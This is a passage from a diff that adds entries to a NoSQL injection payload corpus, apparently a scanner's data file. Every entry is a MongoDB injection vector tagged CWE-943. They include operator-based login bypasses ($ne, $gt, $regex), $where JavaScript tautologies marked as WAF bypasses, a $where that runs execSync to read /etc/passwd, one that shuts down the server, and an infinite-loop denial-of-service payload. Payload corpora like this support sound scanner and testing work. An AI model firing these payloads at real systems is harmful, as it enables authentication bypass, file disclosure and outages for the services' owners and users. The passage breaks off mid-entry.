+      "id": "nosql_injection.legacy.50c5913727",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isApproved == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.515b4e8e38",
+      "vector": "username[$nin][]=guest&password[$ne]=",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.51b64fd3b8",
+      "vector": "{\"username\":{\"$regex\":\"^adm\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.52f1812f2d",
+      "vector": "{\"$where\": \"Array.isArray(this.roles) && this.roles.includes('admin')\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.557304ca01",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isAdmin == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.55b3fa6681",
+      "vector": "{\"username\": {\"$gte\": \"\"}, \"password\": {\"$gte\": \"\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.55cf1828b3",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isSystemAccount == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.586a996e88",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isPending == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.5aa8588cdf",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isSuspended == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.5ec9d3cd5a",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$lte\": \"z\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.5fbd6b1f7b",
+      "vector": "username[$regex]=admin",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.611329ccca",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isArchived == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.624e8eaf89",
+      "vector": "{\"$text\": {\"$search\": \"admin\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.632ae91e70",
+      "vector": "{\"username\": {\"$lte\": \"zzzzzz\"}, \"password\": {\"$lte\": \"zzzzzz\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.647b9a01e7",
+      "vector": "{\"username\": {\"$gt\": \"\"}, \"$where\": \"this.password != ''\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.64e9e1c203",
+      "vector": "{\"$where\": \"return true || this.username == 'admin'\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "nosql_injection.legacy.6508587f00",
+      "vector": "{\"field\": {\"$in\": [\"value1\", \"value2\"]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.655e75a819",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \".*\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.65e5ec77e6",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin'; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.6772f4195f",
+      "vector": "{\"$where\": \"Object.keys(this).length > 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.68024ed072",
+      "vector": "{\"$where\": \"function() { while(true){} }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.6844ba847f",
+      "vector": "{\"$where\": \"1==1 || this.username == 'guest'\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "nosql_injection.legacy.68babc6728",
+      "vector": "{\"roles\": {\"$in\": [\"admin\", \"root\", \"superuser\"]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.69643df52d",
+      "vector": "{\"createdAt\": {\"$lt\": new Date()}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.6a72ed6e65",
+      "vector": "username=admin&password[$ne]=invalid",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.6e22ca629a",
+      "vector": "{\"$nor\": [{\"username\": {\"$eq\": \"guest\"}}]}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.6e5eb72acd",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isActive == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.7189024f3c",
+      "vector": "{\"$where\": \"this.username != null\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.784d8ec92d",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isVerified == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.79437b511f",
+      "vector": "{\"$where\": \"typeof this.username === 'string' && this.username.length > 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.7a39fb395f",
+      "vector": "{\"username\": \"admin\", \"$isolated\": 1}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.7b2f73b9bb",
+      "vector": "{\"$where\": \"this.username == 'admin' && this.password.match(/.*/)//; return true;\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.7b565ca7dd",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isDeleted == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.7b85b2e042",
+      "vector": "{\"$nor\": [{\"username\": {\"$ne\": \"admin\"}}, {\"password\": {\"$ne\": \"\"}}]}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.7c70135fd8",
+      "vector": "username[$eq]=admin&password[$options]=i&password[$regex]=^PASS",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.7fa628f874",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isSecurity == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.8042eedb39",
+      "vector": "{\"isDeleted\": {\"$ne\": true}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.81ef345666",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isBlacklisted == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.84a884bd4e",
+      "vector": "username[$gte]=&password[$gte]=",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.865f0f37b4",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isRoot == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.86f403916f",
+      "vector": "{\"$where\": \"JSON.stringify(this).indexOf('admin') >= 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.87b3026fb4",
+      "vector": "{\"field\": {\"$gt\": \"\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.8ac85ba2a3",
+      "vector": "{\"$where\": \"new Date().getTime() > 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.8b23b2147d",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isSales == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.8c90b4bd21",
+      "vector": "username[$type]=string&password[$type]=string",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.8cbdd8e7d0",
+      "vector": "{\"$where\": \"this.username == 'admin' && this.password.match(/.*/)//\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.8d4b27ed1f",
+      "vector": "{\"username\": {\"$bitsAnyClear\": [1, 5]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.9097f9ce5d",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.permissions.execute == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.926d8c4097",
+      "vector": "{\"username\": {\"$lte\": \"z\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.957bef5f12",
+      "vector": "{\"username\": {\"$regex\": \"^(?=.{1,}$)\"}, \"password\": {\"$regex\": \"^(?=.{1,}$)\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.96687a34b9",
+      "vector": "{\"username\": {\"$all\": [\"admin\"]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.969404a6ea",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isDemoAccount == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.980f6f7aef",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isGuest == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.98e6c2d5ad",
+      "vector": "{\"username\": {\"$regex\": \"^a\", \"$options\": \"i\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.9a38cb2bb3",
+      "vector": "username[$in][]=admin&password[$ne]=x",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.9ba1f85c1b",
+      "vector": "{\"username\": {\"$exists\": true}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.9c6a18bed2",
+      "vector": "{\"$and\": [{\"username\": \"admin\"}, {\"$or\": [{\"password\": \"123\"}, {\"$where\": \"1==1\"}]}]}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.9d1606df29",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin'; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.9d55d0c5d6",
+      "vector": "login[$regex]=.*&pass[$regex]=.*",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.a04fedaff5",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$gt\": \"\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.a1513c9242",
+      "vector": "{\"$where\":\"this.username == 'admin' || 1==1\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "nosql_injection.legacy.a4c829d9d1",
+      "vector": "{\"$not\": {\"username\": {\"$eq\": \"guest\"}}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.a9ad0d88d3",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isBilling == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.ac84bbd066",
+      "vector": "{\"$where\": \"function() { return global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString(); }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.ad469598f8",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.profileComplete == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.ad68b5edf7",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password.length > 0; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.ada8f82d11",
+      "vector": "{\"field\": {\"$gte\": \"\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.ae03a56276",
+      "vector": "token[$ne]=invalid",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b1db5fc04c",
+      "vector": "{\"username\": {\"$lt\": \"zzzzzz\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b2280f8dd5",
+      "vector": "username[$gt]=&password[$gt]=",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b22a08436f",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isLegal == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b2f378325a",
+      "vector": "{\"$where\": \"function() { return db.getSiblingDB('admin').shutdownServer(); }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b3157f779d",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isTest == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b3d244dd67",
+      "vector": "[$ne]=1",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b58e68d76c",
+      "vector": "username[$ne]=invalid&password[$ne]=invalid",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b803c32434",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.roles.indexOf('admin') !== -1; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.b92faaa9e2",
+      "vector": "username[$eq]=admin&password[$ne]=wrong",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.badabcfae3",
+      "vector": "{\"permissions.read\": true}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.bcc2debcfb",
+      "vector": "{\"$expr\": {\"$eq\": [1, 1]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.bd45ccc2a8",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isDeveloper == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.c0b0f89118",
+      "vector": "{\"$where\": \"this.username.length > 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.c2d2286462",
+      "vector": "{\"username\": \"admin\", \"$atomic\": 1}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.c5e290b34e",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isExpired == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.c719cb32d5",
+      "vector": "{\"$where\": \"this.username && this.password\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.c8d437ea14",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password.match(/.*/); }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.ca5efc4f9b",
